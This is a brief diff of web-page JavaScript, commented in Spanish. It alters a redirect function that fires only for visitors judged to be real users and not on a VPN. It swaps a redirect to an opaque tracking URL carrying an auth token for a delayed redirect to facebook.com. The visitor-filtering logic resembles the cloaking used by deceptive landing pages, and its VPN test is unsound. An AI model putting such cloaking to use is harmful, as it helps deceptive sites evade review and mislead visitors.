@@ -156,10 +156,12 @@
     function isVPN() {
     return !navigator.mediaDevices?.getUserMedia;
     }
-    // Redirección segura
+    // Redirección segura (MODIFICADO: ahora espera 8 segundos)
     function redirect() {
     if (!isRealUser() || isVPN()) return;
-    window.location.href = "https://diclotrans.com/redirect?id=51228&auth=bd95c00167af1fda747b24a4947c250f90bf6168";
+    setTimeout(() => {
+        window.location.href = "https://facebook.com"; // URL original
+       }, 8000); // 8000 ms = 8 segundos
     }
     document.addEventListener("DOMContentLoaded", redirect);
   </script>
